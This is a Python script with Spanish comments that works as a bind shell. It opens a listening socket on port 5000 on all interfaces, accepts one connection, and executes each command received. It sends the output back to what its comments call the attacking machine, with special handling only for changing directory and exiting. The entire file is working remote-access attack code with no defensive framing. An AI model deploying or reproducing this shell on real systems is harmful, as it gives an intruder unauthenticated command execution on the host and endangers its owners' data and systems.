from socket import socket
from subprocess import getoutput, Popen
from os import chdir, getcwd
import os
from time import sleep
import platform
import socket as sock_module

def get_hostname():
    if platform.system() == "Windows":
        return sock_module.gethostname()
    else:
        return os.popen("hostname -s").read().strip()

# Definimos la dirección y puerto, la dirección 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
server_address = ('0.0.0.0', 5000)

# Creamos el socket (la conexión)
server_socket = socket()

# Le pasamos la tupla donde especificamos donde escuchar
server_socket.bind(server_address)

# Cantidad de clientes máximos que se pueden conectar:
server_socket.listen(1)

# Obtener la dirección IP de la máquina
ip_address = getoutput('hostname -I').strip()

# Mostrar la dirección IP
print(f"Escuchando en IP: {ip_address}")

# Esperamos a recibir una conexión y aceptarla:
client_socket, client_address = server_socket.accept()

estado = True

while estado:
    # Recibimos el comando de la máquina atacante
    comando = client_socket.recv(4096).decode()

    # Si el cliente envía "exit", cerramos la conexión y salimos del bucle
    if comando == 'exit':
        # Cerramos la conexión con el cliente
        client_socket.close()
        # Cerramos el socket servidor
        server_socket.close()
        estado = False
    
    elif comando.split(" ")[0] == 'cd':
        # Cambiamos de directorio de trabajo
        try:
            chdir(" ".join(comando.split(" ")[1:]))
            client_socket.send(f"Ruta actual: {getcwd()}".encode())
        except FileNotFoundError:
            client_socket.send("Directorio no encontrado.".encode())
    
    else:
        # Ejecutamos el comando y obtenemos su salida
        salida = getoutput(comando)

        # Enviamos la salida a la máquina atacante
        client_socket.send(salida.encode())
    
    sleep(0.1)
